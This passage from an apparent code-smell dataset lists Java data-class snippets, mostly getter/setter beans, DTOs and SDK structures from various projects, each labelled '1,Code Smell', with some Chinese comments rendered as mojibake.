  @Value(""${larkmt.job.i18n}"") private String i18n;
  @Value(""${larkmt.job.accessToken}"") private String accessToken;
  @Value(""${spring.mail.username}"") private String emailUserName;
  @Value(""${larkmt.job.triggerpool.fast.max}"") private int triggerPoolFastMax;
  @Value(""${larkmt.job.triggerpool.slow.max}"") private int triggerPoolSlowMax;
  @Value(""${larkmt.job.logretentiondays}"") private int logretentiondays;
  @Value(""${datasource.aes.key}"") private String dataSourceAESKey;
  @Resource private JobLogMapper jobLogMapper;
  @Resource private JobInfoMapper jobInfoMapper;
  @Resource private JobRegistryMapper jobRegistryMapper;
  @Resource private JobGroupMapper jobGroupMapper;
  @Resource private JobLogReportMapper jobLogReportMapper;
  @Resource private JavaMailSender mailSender;
  @Resource private DataSource dataSource;
  @Resource private JobDatasourceMapper jobDatasourceMapper;
  public String getI18n(){
    return i18n;
  }
  public String getAccessToken(){
    return accessToken;
  }
  public String getEmailUserName(){
    return emailUserName;
  }
  public int getTriggerPoolFastMax(){
    return triggerPoolFastMax < 200 ? 200 : triggerPoolFastMax;
  }
  public int getTriggerPoolSlowMax(){
    return triggerPoolSlowMax < 100 ? 100 : triggerPoolSlowMax;
  }
  public int getLogretentiondays(){
    return logretentiondays < 7 ? -1 : logretentiondays;
  }
  public JobLogMapper getJobLogMapper(){
    return jobLogMapper;
  }
  public JobInfoMapper getJobInfoMapper(){
    return jobInfoMapper;
  }
  public JobRegistryMapper getJobRegistryMapper(){
    return jobRegistryMapper;
  }
  public JobGroupMapper getJobGroupMapper(){
    return jobGroupMapper;
  }
  public JobLogReportMapper getJobLogReportMapper(){
    return jobLogReportMapper;
  }
  public JavaMailSender getMailSender(){
    return mailSender;
  }
  public DataSource getDataSource(){
    return dataSource;
  }
  public JobDatasourceMapper getJobDatasourceMapper(){
    return jobDatasourceMapper;
  }
  public String getDataSourceAESKey(){
    return dataSourceAESKey;
  }
  public void setDataSourceAESKey(  String dataSourceAESKey){
    this.dataSourceAESKey=dataSourceAESKey;
  }
}",1,Code Smell
"public static class Bean7 {
  private final int value;
  private Bean7(  int value){
    this.value=value;
  }
  @JSONCreator public static Bean7 of(  @JSONField(value=true) int value){
    return new Bean7(value);
  }
  public int getValue(){
    return value;
  }
}
private static class Bean7 {
  public Item item;
  public Item item1;
  public Item item2;
  public Item item3;
  public Item item4;
  public Item item5;
  public Item item6;
}",1,Code Smell
"/** 
 * 鏈嶅姟璺敱閰嶇疆
 * @author zhiying.dong@hand-china.com 2018-12-07 14:45:53
 */
public class ServiceRoute extends AuditDomain {
  public ServiceRoute(){
  }
  public ServiceRoute(  @NotNull String serviceCode,  @NotBlank String name,  @NotBlank String path){
    this.serviceCode=serviceCode;
    this.name=name;
    this.path=path;
  }
  private Long serviceRouteId;
  private Long serviceId;
  private String serviceCode;
  private String name;
  private String path;
  private String url;
  private Integer stripPrefix;
  private String sensitiveHeaders;
  private String extendConfigMap;
  public Long getServiceRouteId(){
    return serviceRouteId;
  }
  public void setServiceRouteId(  Long serviceRouteId){
    this.serviceRouteId=serviceRouteId;
  }
  public Long getServiceId(){
    return serviceId;
  }
  public void setServiceId(  Long serviceId){
    this.serviceId=serviceId;
  }
  public String getServiceCode(){
    return serviceCode;
  }
  public void setServiceCode(  String serviceCode){
    this.serviceCode=serviceCode;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getPath(){
    return path;
  }
  public void setPath(  String path){
    this.path=path;
  }
  public String getUrl(){
    return url;
  }
  public void setUrl(  String url){
    this.url=url;
  }
  public Integer getStripPrefix(){
    return stripPrefix;
  }
  public void setStripPrefix(  Integer stripPrefix){
    this.stripPrefix=stripPrefix;
  }
  public String getSensitiveHeaders(){
    return sensitiveHeaders;
  }
  public void setSensitiveHeaders(  String sensitiveHeaders){
    this.sensitiveHeaders=sensitiveHeaders;
  }
  public String getExtendConfigMap(){
    return extendConfigMap;
  }
  public void setExtendConfigMap(  String extendConfigMap){
    this.extendConfigMap=extendConfigMap;
  }
  public boolean ifStripPrefix(){
    return BaseConstants.Flag.YES.equals(this.stripPrefix);
  }
}",1,Code Smell
"public static class DataBean {
  /** 
 * dataType : SquareTopicCard id : 245 title : 浣犲績涓紝涓鍙ユ渶浠や汉蹇冨姩鐨勮〃鐧 joinCount : 4381 viewCount : 27632 showHotSign : true actionUrl : eyepetizer://topic/detail?id=245 imageUrl : http://img.kaiyanapp.com/2620517918873b55306f991e404a07ce.gif haveReward : false ifNewest : true newestEndTime : 1580366259000
 */
  private String dataType;
  private int id;
  private String title;
  private int joinCount;
  private int viewCount;
  private boolean showHotSign;
  private String actionUrl;
  private String imageUrl;
  private boolean haveReward;
  private boolean ifNewest;
  private long newestEndTime;
  public String getDataType(){
    return dataType;
  }
  public void setDataType(  String dataType){
    this.dataType=dataType;
  }
  public int getId(){
    return id;
  }
  public void setId(  int id){
    this.id=id;
  }
  public String getTitle(){
    return title;
  }
  public void setTitle(  String title){
    this.title=title;
  }
  public int getJoinCount(){
    return joinCount;
  }
  public void setJoinCount(  int joinCount){
    this.joinCount=joinCount;
  }
  public int getViewCount(){
    return viewCount;
  }
  public void setViewCount(  int viewCount){
    this.viewCount=viewCount;
  }
  public boolean isShowHotSign(){
    return showHotSign;
  }
  public void setShowHotSign(  boolean showHotSign){
    this.showHotSign=showHotSign;
  }
  public String getActionUrl(){
    return actionUrl;
  }
  public void setActionUrl(  String actionUrl){
    this.actionUrl=actionUrl;
  }
  public String getImageUrl(){
    return imageUrl;
  }
  public void setImageUrl(  String imageUrl){
    this.imageUrl=imageUrl;
  }
  public boolean isHaveReward(){
    return haveReward;
  }
  public void setHaveReward(  boolean haveReward){
    this.haveReward=haveReward;
  }
  public boolean isIfNewest(){
    return ifNewest;
  }
  public void setIfNewest(  boolean ifNewest){
    this.ifNewest=ifNewest;
  }
  public long getNewestEndTime(){
    return newestEndTime;
  }
  public void setNewestEndTime(  long newestEndTime){
    this.newestEndTime=newestEndTime;
  }
}",1,Code Smell
"public final class VASPersonalVipNumberInfo {
  Integer appId;
  Integer itemId;
  Integer numberIdx;
  Integer numberItemId;
  public VASPersonalVipNumberInfo(){
  }
  public Integer getAppId(){
    return this.appId;
  }
  public Integer getItemId(){
    return this.itemId;
  }
  public Integer getNumberIdx(){
    return this.numberIdx;
  }
  public Integer getNumberItemId(){
    return this.numberItemId;
  }
  public String toString(){
    return ""VASPersonalVipNumberInfo{appId="" + this.appId + "",itemId=""+ this.itemId+ "",numberItemId=""+ this.numberItemId+ "",numberIdx=""+ this.numberIdx+ "",}"";
  }
  public VASPersonalVipNumberInfo(  Integer num,  Integer num2,  Integer num3,  Integer num4){
    this.appId=num;
    this.itemId=num2;
    this.numberItemId=num3;
    this.numberIdx=num4;
  }
}",1,Code Smell
"public class CfUserFriend implements Serializable {
  private String id;
  private String uid;
  private String friendId;
  private Long createTime;
  public CfUserFriend(){
  }
  public CfUserFriend(  String id,  String uid,  String friendId,  Long createTime){
    this.id=id;
    this.uid=uid;
    this.friendId=friendId;
    this.createTime=createTime;
  }
  private static final long serialVersionUID=1L;
  public String getId(){
    return id;
  }
  public void setId(  String id){
    this.id=id == null ? null : id.trim();
  }
  public String getUid(){
    return uid;
  }
  public void setUid(  String uid){
    this.uid=uid == null ? null : uid.trim();
  }
  public String getFriendId(){
    return friendId;
  }
  public void setFriendId(  String friendId){
    this.friendId=friendId == null ? null : friendId.trim();
  }
  public Long getCreateTime(){
    return createTime;
  }
  public void setCreateTime(  Long createTime){
    this.createTime=createTime;
  }
}",1,Code Smell
"/** 
 * 寮�闂告暟鎹�
 */
public class GpioData implements Serializable {
  private String ionum;
  private String action;
  public String getIonum(){
    return ionum;
  }
  public void setIonum(  String ionum){
    this.ionum=ionum;
  }
  public String getAction(){
    return action;
  }
  public void setAction(  String action){
    this.action=action;
  }
}
",1,Code Smell
"public static class NET_CLOUD_UPGRADER_STATE extends SdkStructure {
  public int dwSize;
  public int emState;
  public int nProgress;
  public byte[] szFileName=new byte[NET_COMMON_STRING_128];
  public long nTotalLen;
  public NET_CLOUD_UPGRADER_STATE(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"public static class NET_UAVCMD_LAND extends SdkStructure {
  public NET_UAVCMD_COMMON stuCommon;
  public float fYawAngle;
  public float fLatitude;
  public float fLongitude;
  public float fAltitude;
  public byte[] byReserved=new byte[12];
}",1,Code Smell
"public static class MimeType {
  public static int IMAGE=1;
  public static int AUDIO=2;
  public static int VIDEO=4;
  public static int DOCUMENT=8;
  public static int ARCHIVE=16;
  public static int LINK=32;
  public static int OTHERS=64;
  public static int ALL=IMAGE | AUDIO | VIDEO| DOCUMENT| ARCHIVE| LINK| OTHERS;
}",1,Code Smell
"public static class TcpTunnel {
  static AtomicInteger tunnelIds=new AtomicInteger(0);
  public final int tunnelId=tunnelIds.addAndGet(1);
  public long mySequenceNum=0;
  public long theirSequenceNum=0;
  public long myAcknowledgementNum=0;
  public long theirAcknowledgementNum=0;
  public TCBStatus tcbStatus=TCBStatus.SYN_SENT;
  public BlockingQueue<Packet> tunnelInputQueue=new ArrayBlockingQueue<Packet>(1024);
  public InetSocketAddress sourceAddress;
  public InetSocketAddress destinationAddress;
  public SocketChannel destSocket;
  private VpnService vpnService;
  BlockingQueue<ByteBuffer> networkToDeviceQueue;
  public int packId=1;
  public boolean upActive=true;
  public boolean downActive=true;
  public String tunnelKey;
  public BlockingQueue<String> tunnelCloseMsgQueue;
}",1,Code Smell
"/** 
 * Anthropic API connection properties.
 * @author Christian Tzolov
 * @since 1.0.0
 */
@ConfigurationProperties(AnthropicConnectionProperties.CONFIG_PREFIX) public class AnthropicConnectionProperties {
  public static final String CONFIG_PREFIX=""spring.ai.anthropic"";
  /** 
 * Anthropic API access key.
 */
  private String apiKey;
  /** 
 * Anthropic API base URL.
 */
  private String baseUrl=AnthropicApi.DEFAULT_BASE_URL;
  /** 
 * Anthropic API version.
 */
  private String version=AnthropicApi.DEFAULT_ANTHROPIC_VERSION;
  public String getApiKey(){
    return this.apiKey;
  }
  public void setApiKey(  String apiKey){
    this.apiKey=apiKey;
  }
  public String getBaseUrl(){
    return this.baseUrl;
  }
  public void setBaseUrl(  String baseUrl){
    this.baseUrl=baseUrl;
  }
  public String getVersion(){
    return this.version;
  }
  public void setVersion(  String version){
    this.version=version;
  }
}",1,Code Smell
"/** 
 * CacheClusterSet
 */
public class CacheClusterSetObject {
  private String setName;
  private String type;
  private List<CacheClusterObject> cacheClusters=new ArrayList<>();
  private List<CacheTopicObject> topics=new ArrayList<>();
  /** 
 * get setName
 * @return the setName
 */
  public String getSetName(){
    return setName;
  }
  /** 
 * set setName
 * @param setName the setName to set
 */
  public void setSetName(  String setName){
    this.setName=setName;
  }
  /** 
 * get type
 * @return the type
 */
  public String getType(){
    return type;
  }
  /** 
 * set type
 * @param type the type to set
 */
  public void setType(  String type){
    this.type=type;
  }
  /** 
 * get cacheClusters
 * @return the cacheClusters
 */
  public List<CacheClusterObject> getCacheClusters(){
    return cacheClusters;
  }
  /** 
 * set cacheClusters
 * @param cacheClusters the cacheClusters to set
 */
  public void setCacheClusters(  List<CacheClusterObject> cacheClusters){
    this.cacheClusters=cacheClusters;
  }
  /** 
 * get topics
 * @return the topics
 */
  public List<CacheTopicObject> getTopics(){
    return topics;
  }
  /** 
 * set topics
 * @param topics the topics to set
 */
  public void setTopics(  List<CacheTopicObject> topics){
    this.topics=topics;
  }
}
",1,Code Smell
"public static class NET_DVR_ETHERNET extends Structure {
  public byte[] sDVRIP=new byte[16];
  public byte[] sDVRIPMask=new byte[16];
  public int dwNetInterface;
  public short wDVRPort;
  public byte[] byMACAddr=new byte[MACADDR_LEN];
}",1,Code Smell
"public class AccountDTO {
  private Account account;
  private List<CloudTask> cloudTaskList;
  public Account getAccount(){
    return account;
  }
  public void setAccount(  Account account){
    this.account=account;
  }
  public List<CloudTask> getCloudTaskList(){
    return cloudTaskList;
  }
  public void setCloudTaskList(  List<CloudTask> cloudTaskList){
    this.cloudTaskList=cloudTaskList;
  }
}
",1,Code Smell
"/** 
 * An object containing the flags for each moderation category https://beta.openai.com/docs/api-reference/moderations/create
 */
@Data public class ModerationCategories {
  public boolean hate;
  @JsonProperty(""hate/threatening"") public boolean hateThreatening;
  @JsonProperty(""self-harm"") public boolean selfHarm;
  public boolean sexual;
  @JsonProperty(""sexual/minors"") public boolean sexualMinors;
  public boolean violence;
  @JsonProperty(""violence/graphic"") public boolean violenceGraphic;
}
",1,Code Smell
"public static class NET_SELFCHECK_INFO extends SdkStructure {
  public int dwSize;
  public int nAlarmIn;
  public int nAlarmOut;
  public NET_TIME stuTime;
  public byte[] szPlateNo=new byte[NET_MAX_PLATE_NUMBER_LEN];
  public byte[] szICCID=new byte[NET_MAX_SIM_LEN];
  public byte byOrientation;
  public byte byACCState;
  public byte byConstantElecState;
  public byte byAntennaState;
  public byte byReportStation;
  public byte byControlScreen;
  public byte byPOS;
  public byte byCoinBox;
  public int bTimerSnap;
  public int bElectronEnclosure;
  public int bTeleUpgrade;
  public int nHddNum;
  public NET_HDD_STATE[] stuHddStates=new NET_HDD_STATE[NET_MAX_DISKNUM];
  public Pointer pChannleState;
  public int nChannleNum;
  public int nChannelMax;
  public int emConnState;
  public int emHomeState;
  public byte[] szICCIDExInfo=new byte[NET_COMMON_STRING_256];
  public byte by3GState;
  public byte byWifiState;
  public byte byGpsState;
  public byte byBlackBoxState;
  public int nCpuUsage;
  public int nTemperature;
  public byte[] szVendor=new byte[32];
  public byte[] szFirmwareVersion=new byte[128];
  public byte[] szSecurityBaseLineVersion=new byte[8];
  public NET_GPS_STATUS_INFO stuGPSStatusInfo;
  public byte[] szNetworkOperName=new byte[32];
  public int emEmergencyStatus;
  public int emTamperAletStatus;
  public byte[] szImei=new byte[16];
  public int nGSMsignalStrength;
  public int nMcc;
  public int nMnc;
  public int nLAC;
  public int nCi;
  public int nAlarmInStatusNum;
  public int[] nAlarmInStatus=new int[32];
  public int nAlarmOutStatusNum;
  public int[] nAlarmOutStatus=new int[32];
  public byte[] szMasterSvrAddr=new byte[128];
  public byte[] szSlaveSvrAddr=new byte[128];
  public byte[] szSerialNo=new byte[48];
  public NET_SELFCHECK_INFO(){
    this.dwSize=this.size();
    for (int i=0; i < NET_MAX_DISKNUM; i++) {
      stuHddStates[i]=new NET_HDD_STATE();
    }
  }
}",1,Code Smell
"public class AccountDTO implements Serializable {
  private Long id;
  private String userName;
  private int age;
  private IDCard idCard;
  private List<Book> books;
  @RelationManyToMany(joinTable=""tb_role_mapping"",joinSelfColumn=""account_id"",joinTargetColumn=""role_id"",selfField=""id"") private List<Role> roles;
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public String getUserName(){
    return userName;
  }
  public void setUserName(  String userName){
    this.userName=userName;
  }
  public int getAge(){
    return age;
  }
  public void setAge(  int age){
    this.age=age;
  }
  public IDCard getIdCard(){
    return idCard;
  }
  public void setIdCard(  IDCard idCard){
    this.idCard=idCard;
  }
  public List<Book> getBooks(){
    return books;
  }
  public void setBooks(  List<Book> books){
    this.books=books;
  }
  public List<Role> getRoles(){
    return roles;
  }
  public void setRoles(  List<Role> roles){
    this.roles=roles;
  }
  @Override public String toString(){
    return ""AccountDTO{"" + ""id="" + id + "", userName='""+ userName+ '\''+ "", age=""+ age+ "", idCard=""+ idCard+ "", books=""+ books+ "", roles=""+ roles+ '}';
  }
}
",1,Code Smell
"public class GetHomePageResponse {
  public String api;
  @JSONField(name=""v"") public String version;
  public String ret;
  public GetHomePageData data;
}
",1,Code Smell
"@Data @NoArgsConstructor public class FileManagementQuery {
  public String projectId;
  public String keyword;
  public List<String> moduleIds;
  public String fileType;
  public String operator;
  public String storage=StorageType.MINIO.name();
  public List<String> hiddenIds=new ArrayList<>();
  public FileManagementQuery(  FileBatchProcessRequest batchProcessDTO){
    this.projectId=batchProcessDTO.getProjectId();
    this.keyword=batchProcessDTO.getCondition().getKeyword();
    this.moduleIds=batchProcessDTO.getModuleIds();
    this.fileType=batchProcessDTO.getFileType();
    if (MapUtils.isNotEmpty(batchProcessDTO.getCondition().getCombine())) {
      if (batchProcessDTO.getCondition().getCombine().get(""createUser"") != null) {
        this.operator=batchProcessDTO.getCondition().getCombine().get(""createUser"").toString();
      }
      if (batchProcessDTO.getCondition().getCombine().get(""storage"") != null) {
        this.storage=batchProcessDTO.getCondition().getCombine().get(""storage"").toString();
      }
    }
  }
  public FileManagementQuery(  FileMetadataTableRequest batchProcessDTO){
    this.projectId=batchProcessDTO.getProjectId();
    this.keyword=batchProcessDTO.getKeyword();
    this.moduleIds=batchProcessDTO.getModuleIds();
    this.fileType=batchProcessDTO.getFileType();
    if (MapUtils.isNotEmpty(batchProcessDTO.getCombine())) {
      if (batchProcessDTO.getCombine().get(""createUser"") != null) {
        this.operator=batchProcessDTO.getCombine().get(""createUser"").toString();
      }
      if (batchProcessDTO.getCombine().get(""storage"") != null) {
        this.storage=batchProcessDTO.getCombine().get(""storage"").toString();
      }
      if (batchProcessDTO.getCombine().get(""hiddenIds"") != null) {
        this.hiddenIds=JSON.parseArray(JSON.toJSONString(batchProcessDTO.getCombine().get(""hiddenIds"")));
      }
    }
  }
}
",1,Code Smell
"/** 
 * @author 47081
 * @version 1.0
 * @description \if ENGLISH_LANG<p> \else 澶槼鑳芥澘淇℃伅 \endif
 * @date 2020/8/11
 */
public class SOLARCELL_PANEL_INFO extends NetSDKLib.SdkStructure {
  /** 
 * 鐢靛帇锛堝崟浣嶏細浼忕壒锛�
 */
  public float fVoltage;
  /** 
 * 鐢垫祦锛堝崟浣嶏細瀹夊煿锛�
 */
  public float fElectricCurrent;
  /** 
 * 鍏呯數鍔熺巼
 */
  public float fChargingPower;
  /** 
 * 淇濈暀瀛楄妭
 */
  public byte[] byReserved=new byte[252];
}",1,Code Smell
"public final class GProVersionNews {
  String jumpFeedUrl;
  ArrayList<String> newsUrlList;
  String subtitle;
  String title;
  public GProVersionNews(){
    this.title="""";
    this.subtitle="""";
    this.newsUrlList=new ArrayList<>();
    this.jumpFeedUrl="""";
  }
  public String getJumpFeedUrl(){
    return this.jumpFeedUrl;
  }
  public ArrayList<String> getNewsUrlList(){
    return this.newsUrlList;
  }
  public String getSubtitle(){
    return this.subtitle;
  }
  public String getTitle(){
    return this.title;
  }
  public String toString(){
    return ""GProVersionNews{title="" + this.title + "",subtitle=""+ this.subtitle+ "",newsUrlList=""+ this.newsUrlList+ "",jumpFeedUrl=""+ this.jumpFeedUrl+ "",}"";
  }
  public GProVersionNews(  String str,  String str2,  ArrayList<String> arrayList,  String str3){
    this.title="""";
    this.subtitle="""";
    this.newsUrlList=new ArrayList<>();
    this.jumpFeedUrl="""";
    this.title=str;
    this.subtitle=str2;
    this.newsUrlList=arrayList;
    this.jumpFeedUrl=str3;
  }
}",1,Code Smell
"public static class SendAnimationData {
  public float x;
  public float y;
  public float width;
  public float height;
  public float currentScale;
  public float currentX;
  public float currentY;
  public float timeAlpha;
}
",1,Code Smell
"@Table(value=""tb_account"",dataSource=""ds2"",onSet=AccountOnSetListener.class) public class Account extends BaseEntity implements Serializable, AgeAware {
  private static final long serialVersionUID=1L;
  @Id(keyType=KeyType.Auto) @ColumnAlias(""account_id"") private Long id;
  @ColumnMask(Masks.CHINESE_NAME) private String userName;
  @ColumnAlias(""my_age"") private int age;
  private SexEnum sex;
  @NotBlank private Date birthday;
  @Column(typeHandler=Fastjson2TypeHandler.class) private Map<String,Object> options;
  private Boolean isDelete;
  private List<Article> articles;
  @Column(ignore=true) private String title;
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public String getUserName(){
    return userName;
  }
  public void setUserName(  String userName){
    this.userName=userName;
  }
  @Override public int getAge(){
    return age;
  }
  @Override public void setAge(  int age){
    this.age=age;
  }
  public SexEnum getSex(){
    return sex;
  }
  public void setSex(  SexEnum sex){
    this.sex=sex;
  }
  public Date getBirthday(){
    return birthday;
  }
  public void setBirthday(  Date birthday){
    this.birthday=birthday;
  }
  public Map<String,Object> getOptions(){
    return options;
  }
  public void setOptions(  Map<String,Object> options){
    this.options=options;
  }
  public void addOption(  String key,  Object value){
    if (options == null) {
      options=new HashMap<>();
    }
    options.put(key,value);
  }
  public Boolean getDelete(){
    return isDelete;
  }
  public void setDelete(  Boolean delete){
    isDelete=delete;
  }
  public List<Article> getArticles(){
    return articles;
  }
  public void setArticles(  List<Article> articles){
    this.articles=articles;
  }
  public String getTitle(){
    return title;
  }
  public void setTitle(  String title){
    this.title=title;
  }
  @Override public String toString(){
    return ""Account{"" + ""id="" + id + "", userName='""+ userName+ '\''+ "", age=""+ age+ "", sex=""+ sex+ "", birthday=""+ birthday+ "", options=""+ options+ "", isDelete=""+ isDelete+ "", articles=""+ articles+ "", title='""+ title+ '\''+ '}';
  }
}",1,Code Smell
"public static final class PlaybackInfoUpdate {
  private boolean hasPendingChange;
  public PlaybackInfo playbackInfo;
  public int operationAcks;
  public boolean positionDiscontinuity;
  public @DiscontinuityReason int discontinuityReason;
  public boolean hasPlayWhenReadyChangeReason;
  public @PlayWhenReadyChangeReason int playWhenReadyChangeReason;
  public PlaybackInfoUpdate(  PlaybackInfo playbackInfo){
    this.playbackInfo=playbackInfo;
  }
  public void incrementPendingOperationAcks(  int operationAcks){
    hasPendingChange|=operationAcks > 0;
    this.operationAcks+=operationAcks;
  }
  public void setPlaybackInfo(  PlaybackInfo playbackInfo){
    hasPendingChange|=this.playbackInfo != playbackInfo;
    this.playbackInfo=playbackInfo;
  }
  public void setPositionDiscontinuity(  @DiscontinuityReason int discontinuityReason){
    if (positionDiscontinuity && this.discontinuityReason != Player.DISCONTINUITY_REASON_INTERNAL) {
      Assertions.checkArgument(discontinuityReason == Player.DISCONTINUITY_REASON_INTERNAL);
      return;
    }
    hasPendingChange=true;
    positionDiscontinuity=true;
    this.discontinuityReason=discontinuityReason;
  }
  public void setPlayWhenReadyChangeReason(  @PlayWhenReadyChangeReason int playWhenReadyChangeReason){
    hasPendingChange=true;
    this.hasPlayWhenReadyChangeReason=true;
    this.playWhenReadyChangeReason=playWhenReadyChangeReason;
  }
}",1,Code Smell
"private static class TokenPattern {
  public final CachedPattern pattern;
  public int group=-1;
  public boolean lookbehind;
  public boolean greedy;
  public TokenPattern[] insideTokenPatterns;
  public String insideLanguage;
  public TokenPattern(  int group,  CachedPattern pattern){
    this.pattern=pattern;
    this.group=group;
  }
  public TokenPattern(  CachedPattern pattern,  TokenPattern... inside){
    this.pattern=pattern;
    this.insideTokenPatterns=inside;
  }
  public TokenPattern(  CachedPattern pattern,  String lang){
    this.pattern=pattern;
    this.insideLanguage=lang;
  }
  public TokenPattern(  int group,  CachedPattern pattern,  TokenPattern... inside){
    this.group=group;
    this.pattern=pattern;
    this.insideTokenPatterns=inside;
  }
}",1,Code Smell
"public class JobLogInfo implements Delayed {
  private String jobId;
  private JobIdentifier jobIdentifier;
  private int computeType;
  private long expired;
  private String customLog;
  private EJobLogType logType;
  public JobLogInfo(  String jobId,  JobIdentifier jobIdentifier,  int computeType,  long delay,  EJobLogType logType){
    this.jobId=jobId;
    this.jobIdentifier=jobIdentifier;
    this.computeType=computeType;
    this.expired=System.currentTimeMillis() + delay;
    this.logType=logType;
  }
  public JobLogInfo(){
  }
  public EJobLogType getLogType(){
    return logType;
  }
  public String getCustomLog(){
    return customLog;
  }
  public void setCustomLog(  String customLog){
    this.customLog=customLog;
  }
  public String getJobId(){
    return jobId;
  }
  public void setJobId(  String jobId){
    this.jobId=jobId;
  }
  public int getComputeType(){
    return computeType;
  }
  public void setComputeType(  int computeType){
    this.computeType=computeType;
  }
  public JobIdentifier getJobIdentifier(){
    return jobIdentifier;
  }
  public void setJobIdentifier(  JobIdentifier jobIdentifier){
    this.jobIdentifier=jobIdentifier;
  }
  @Override public long getDelay(  TimeUnit unit){
    return unit.convert(this.expired - System.currentTimeMillis(),TimeUnit.MILLISECONDS);
  }
  @Override public int compareTo(  Delayed o){
    return (int)(this.getDelay(TimeUnit.MILLISECONDS) - o.getDelay(TimeUnit.MILLISECONDS));
  }
}
",1,Code Smell
"public static class NET_FILE_STREAM_TYPE extends SdkStructure {
  public static final int NET_FILE_STREAM_TYPE_UNKNOWN=0;
  public static final int NET_FILE_STREAM_TYPE_NORMAL=1;
  public static final int NET_FILE_STREAM_TYPE_ALARM=2;
  public static final int NET_FILE_STREAM_TYPE_DETECTION=3;
}",1,Code Smell
"/** 
 * Stores state that is initialized when preparation completes. 
 */
private static final class PreparedState {
  public final SeekMap seekMap;
  public final TrackGroupArray tracks;
  public final boolean[] trackIsAudioVideoFlags;
  public final boolean[] trackEnabledStates;
  public final boolean[] trackNotifiedDownstreamFormats;
  public PreparedState(  SeekMap seekMap,  TrackGroupArray tracks,  boolean[] trackIsAudioVideoFlags){
    this.seekMap=seekMap;
    this.tracks=tracks;
    this.trackIsAudioVideoFlags=trackIsAudioVideoFlags;
    this.trackEnabledStates=new boolean[tracks.length];
    this.trackNotifiedDownstreamFormats=new boolean[tracks.length];
  }
}
",1,Code Smell
"public static class RiskInfosBean {
  /** 
 * type : 0 content : warn : false
 */
  private int type;
  private String content;
  private boolean warn;
  public int getType(){
    return type;
  }
  public void setType(  int type){
    this.type=type;
  }
  public String getContent(){
    return content;
  }
  public void setContent(  String content){
    this.content=content;
  }
  public boolean isWarn(){
    return warn;
  }
  public void setWarn(  boolean warn){
    this.warn=warn;
  }
}",1,Code Smell
"public class ComponentBindDBDTO {
  public Integer getComponentCode(){
    return componentCode;
  }
  public void setComponentCode(  Integer componentCode){
    this.componentCode=componentCode;
  }
  public Boolean getCreateFlag(){
    return createFlag;
  }
  public void setCreateFlag(  Boolean createFlag){
    this.createFlag=createFlag;
  }
  public String getDbName(){
    return dbName;
  }
  public void setDbName(  String dbName){
    this.dbName=dbName;
  }
  /** 
 * 缁勪欢绫诲瀷
 */
  private Integer componentCode;
  /** 
 * 鍒涘缓/瀵规帴
 */
  private Boolean createFlag;
  /** 
 * db 鍚嶇О
 */
  private String dbName;
}
",1,Code Smell
"/** 
 * ISO7816-4 APDU.
 */
public class APDUCommand {
  protected int cla;
  protected int ins;
  protected int p1;
  protected int p2;
  protected byte[] data;
  protected boolean needsLE;
  /** 
 * Constructs an APDU with no response data length field. The data field cannot be null, but can be a zero-length array.
 * @param cla  class byte
 * @param ins  instruction code
 * @param p1   P1 parameter
 * @param p2   P2 parameter
 * @param data the APDU data
 */
  public APDUCommand(  int cla,  int ins,  int p1,  int p2,  byte[] data){
    this(cla,ins,p1,p2,data,false);
  }
  /** 
 * Constructs an APDU with an optional data length field. The data field cannot be null, but can be a zero-length array. The LE byte, if sent, is set to 0.
 * @param cla     class byte
 * @param ins     instruction code
 * @param p1      P1 parameter
 * @param p2      P2 parameter
 * @param data    the APDU data
 * @param needsLE whether the LE byte should be sent or not
 */
  public APDUCommand(  int cla,  int ins,  int p1,  int p2,  byte[] data,  boolean needsLE){
    this.cla=cla & 0xff;
    this.ins=ins & 0xff;
    this.p1=p1 & 0xff;
    this.p2=p2 & 0xff;
    this.data=data;
    this.needsLE=needsLE;
  }
  /** 
 * Serializes the APDU in order to send it to the card.
 * @return the byte array representation of the APDU
 */
  public byte[] serialize(){
    ByteArrayOutputStream out=new ByteArrayOutputStream();
    out.write(this.cla);
    out.write(this.ins);
    out.write(this.p1);
    out.write(this.p2);
    out.write(this.data.length);
    out.write(this.data,0,this.data.length);
    if (this.needsLE) {
      out.write(0);
    }
    return out.toByteArray();
  }
  /** 
 * Serializes the APDU to human readable hex string format
 * @return the hex string representation of the APDU
 */
  public String toHexString(){
    byte[] raw=this.serialize();
    if (raw == null) {
      return """";
    }
    return Utils.bytesToHex(raw);
  }
  /** 
 * Returns the CLA of the APDU
 * @return the CLA of the APDU
 */
  public int getCla(){
    return cla;
  }
  /** 
 * Returns the INS of the APDU
 * @return the INS of the APDU
 */
  public int getIns(){
    return ins;
  }
  /** 
 * Returns the P1 of the APDU
 * @return the P1 of the APDU
 */
  public int getP1(){
    return p1;
  }
  /** 
 * Returns the P2 of the APDU
 * @return the P2 of the APDU
 */
  public int getP2(){
    return p2;
  }
  /** 
 * Returns the data field of the APDU
 * @return the data field of the APDU
 */
  public byte[] getData(){
    return data;
  }
  /** 
 * Returns whether LE is sent or not.
 * @return whether LE is sent or not
 */
  public boolean getNeedsLE(){
    return this.needsLE;
  }
}",1,Code Smell
"public static class EM_ATTACHMENT_TYPE extends SdkStructure {
  public static final int EM_ATTACHMENT_UNKNOWN=0;
  public static final int EM_ATTACHMENT_OTHER=1;
  public static final int EM_ATTACHMENT_FURNITURE=2;
  public static final int EM_ATTACHMENT_PENDANT=3;
  public static final int EM_ATTACHMENT_TISSUEBOX=4;
  public static final int EM_ATTACHMENT_DANGER=5;
  public static final int EM_ATTACHMENT_PERFUMEBOX=6;
}",1,Code Smell
"public static class NET_ORDINARY_INFO extends SdkStructure {
  public int bTempletState;
  public byte[] szDescription=new byte[MAX_COMMON_STRING_128];
  public int nWhnCount;
  public NET_GUIDESCREEN_WINDOW_INFO[] stuWindowsInfo=(NET_GUIDESCREEN_WINDOW_INFO[])new NET_GUIDESCREEN_WINDOW_INFO().toArray(MAX_WINDOWS_COUNT);
  public byte[] byReserved=new byte[128];
}",1,Code Smell
"public static class NET_DVR_VIDEO_INTERCOM_EVENT_INFO_UINON extends Union {
  public byte[] byLen=new byte[256];
  public NET_DVR_UNLOCK_RECORD_INFO struUnlockRecord=new NET_DVR_UNLOCK_RECORD_INFO();
  public NET_DVR_NOTICEDATA_RECEIPT_INFO struNoticedataReceipt=new NET_DVR_NOTICEDATA_RECEIPT_INFO();
  public NET_DVR_AUTH_INFO struAuthInfo=new NET_DVR_AUTH_INFO();
